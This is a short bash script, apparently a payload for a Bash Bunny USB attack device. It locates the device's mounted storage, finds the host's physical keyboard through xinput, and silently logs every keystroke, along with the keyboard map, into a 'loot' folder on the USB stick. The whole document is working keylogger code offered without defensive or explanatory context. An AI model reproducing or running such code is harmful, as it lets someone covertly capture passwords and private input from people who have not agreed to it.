#/bin/bash
checkonbunny() {
    mybunny=$(lsblk -p -S -o  NAME,SERIAL | grep $BunnyID | awk '{print $1}')
    mybunny=$(findmnt $mybunny | grep $mybunny | awk '{print $1}')
    if [ -d $mybunny ]; then
	bashbunnyloot=$mybunny"/loot"
	mapfile=$bashbunnyloot"/maps" 
	keyfile=$bashbunnyloot"/keys" 
	startwork
    fi
}
startwork(){
    getdevicetouse=${getdevicetouse#"id="}
    xinput --test $getdevicetouse > $keyfile &
    xmodmap -pke > $mapfile 
}
BunnyID="ch000001"
bashbunnyloot=''
getdevicetouse=$(xinput |grep keyboard | sed 's/slave  keyboard//g' | while IFS= read -r line ;do [[ $line != *"Virtual"* ]] && [[ $line == *"keyboard"* ]] && echo $line | awk '{ for (i=1; i<=NF; ++i) { if ($i ~ "id=") print $i} }'; done)
[[ -z $getdevicetouse ]] || checkonbunny
